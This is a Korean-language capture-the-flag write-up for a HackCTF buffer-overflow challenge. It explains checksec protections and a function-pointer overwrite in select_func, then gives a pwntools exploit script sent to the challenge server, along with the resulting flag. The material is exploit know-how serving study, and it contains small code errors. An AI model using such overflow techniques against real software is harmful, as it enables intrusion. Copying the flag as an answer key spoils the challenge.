풀이

checksec 를 입력했을떄

CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : ENABLED
RELRO : FULL

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
1.CANARY 은 스택의 BOF를 모니터링 하는 역할을 담당 즉 BOF가 발생하면 오버플로우 경고후
강제 종료

2.FORTIFY 은

일반적인 메모리 버퍼에서 발생하는 BOF를 잡기 위해 존재합니다.

입력된 데이터의 크기를 확인하여 잡아내는 것 같습니다.

이 보호기법이 활성화되어있다면 BOF를 일으키기 어렵다.


3.NX 은 데이터 영역에서 코드가 실행되는것을 방지하는 기법 즉 쉘코드로 인한 공격을 차단

4.PIE 은 실행코드 내의 주소를 모두 상대주소로 만들어 실행파일이 메모리의 어느위치에 있더라도
성공적으로 실행될수 있게 컴파일된 실행파일 즉 리턴주소로 가리키지 않아도 실행가능

5.RELRO 은 GOT Overwirte 공격에 대비하여 ELF 바이너리 또는 프로세스의 데이터 섹션을
보호하는 기술, 따라서 FULL로 설정되면 GOT Overwirte 를 할수가없다.

GOT Overwirte >> 실제 해당주소를 다른주소로 인식하게 만드는것 
( 쉽게말해서 내가 실행시키고자하는 주소로 ret주소를 바꾸는것)

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


따라서 위의 내용을 통해서 알수있는 정보로는

NX , PIE , RELRO 가 메모리보호기법이 적용되어있으므로

일단은 

1.쉘코드 사용불가
2.정확한 주소를 찾기힘듦
3. OGT Overwirte 기법 사용불가능


나머지는 두개를 걸려있지않으므로

위의 내용을 뺸 나머지 방법으로 BOF 를 일으켜야한다.

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

CANRY 가 걸려있지 않으므로 BOF 발생 가능

FORTLY 가 걸려있지 않으므로

BOF 를 잡을 기법이 활성화가 되어있지 않아 발생가능

쉘을 실행하기위해 아마 /bin/bash 함수가 있을거야

지금 쉘코드 실행 불가기떄문


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


main 코드를 보면 get 함수가 취약점이므로 그쪽에서부터 BOF 를 일으키는것을 알수있는데
get 을 받는 함수를 보면 select_func 이다. 이함수를 읽으면

void select_func(char *param_1)

{
  int iVar1;
  char local_2e [30];
  code *local_10;
  
  local_10 = two;
  strncpy(local_2e,param_1,0x1f);
  iVar1 = strcmp(local_2e,"one");
  if (iVar1 == 0) {
    local_10 = one;
  }
  (*local_10)();
  return;
}

인데 보통은 TWO 로 받고 ONE 이랑 같은시 ONE 을 local_10에 넣고 그것을 리턴한다는 뜻

따라서 TWO 함수를 봐보자
단순한 함수이다.

따라서 우리는 print_flag 를 실행시켜야하는데 local_10 에서 받는 Two 를 변조시키면 될듯하다.

select_func 의 버퍼는 30

우리 총버퍼는 0x27 == 39   여기서 SPF 와 ret를 빼면 31바이트

#( 이문제는 쉘코드 got 등 다막혀있기떄문에 ret주소를 쓸수가없음 )
# 즉 BOF를 get함수에서 일으켜서 내가 원하는 파일을 실행하게 만들어야함

페이로드는 버퍼 30 + 주소(1바이트) 이다.

그러므로 A*30 + 0xD8 을 해주면된다. 

페이로드를 작성 해보자.

from pwn import *

p = remote("ctf.j0n9hyun.xyz",3007)

p.recvuntil("Which function would you like to call?")

pay = A*30
pay += p32(0xD8)

p.sendline(pay)
p.interactive()


를 python 으로 컴파일 하면

HackCTF{76155655017129668567067265451379677609132507783606}

flag가 나온다.
